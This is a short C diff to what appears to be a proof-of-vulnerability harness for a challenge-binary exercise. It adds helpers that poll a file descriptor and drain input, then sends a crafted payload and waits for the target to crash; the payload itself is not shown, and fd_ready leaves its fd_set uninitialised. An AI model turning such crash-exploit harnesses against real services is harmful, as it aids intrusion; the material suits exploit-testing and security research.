@@ -62,6 +62,50 @@ int strlen(char *s) {
   return len;
 }
 
+int fd_ready(int fd) {
+  struct timeval tv;
+  fd_set rfds;
+  int readyfds = 0;
+
+  FD_SET(fd, &rfds);
+
+  tv.tv_sec = 1;
+  tv.tv_usec = 0;
+
+  int ret;
+  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);
+
+  /* bail if fdwait fails */
+  if (ret != 0) {
+    return 0;
+  }
+  if (readyfds == 0)
+    return 0;
+
+  return 1;
+}
+
+// receive into no particular buffer
+size_t blank_receive( int fd, size_t n_bytes )
+{
+  size_t len = 0;
+  size_t rx = 0;
+  char junk_byte;
+
+  while (len < n_bytes) {
+    if (!fd_ready(fd)) {
+        return len;
+    }
+    if (receive(fd, &junk_byte, 1, &rx) != 0) {
+      len = 0;
+      break;
+    }
+    len += rx;
+  }
+
+  return len;
+}
+
 size_t receive_until(int fd, char *dst, char delim, size_t max )
 {
     size_t len = 0;
@@ -225,7 +269,13 @@ int main() {
   int total_len = curr-payload;
   send_all(3, &total_len, 4);
   send_all(3, payload, total_len);
+  // uncomment to debug
+  //send_all(2, payload, curr-payload);
   send_all(1, payload, curr-payload);
+
+  // make sure we wait till it crashes
+  blank_receive(0, 0x2000);
+
   return 0;
 }
 
